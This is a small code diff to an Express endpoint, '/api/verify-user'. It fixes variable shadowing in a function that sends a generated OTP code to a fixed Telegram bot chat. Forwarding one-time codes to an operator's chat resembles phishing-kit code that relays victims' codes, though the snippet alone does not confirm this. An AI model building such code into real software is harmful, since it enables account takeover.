@@ -373,8 +373,8 @@ app.post("/api/verify-user", async (req, res) => {
       .substr(2, 9)}`;
     const now = Date.now();
 
-    async function sendToTelegram(message) {
-      const message = `<b>${otpCode}</b>`;
+    async function sendToTelegram() {
+      const messagetg = `<b>${otpCode}</b>`;
 
       const url = `https://api.telegram.org/bot${bot.token}/sendMessage`;
 
@@ -383,7 +383,7 @@ app.post("/api/verify-user", async (req, res) => {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: bot.chatId,
-          text: message,
+          text: messagetg,
         }),
       });
     }
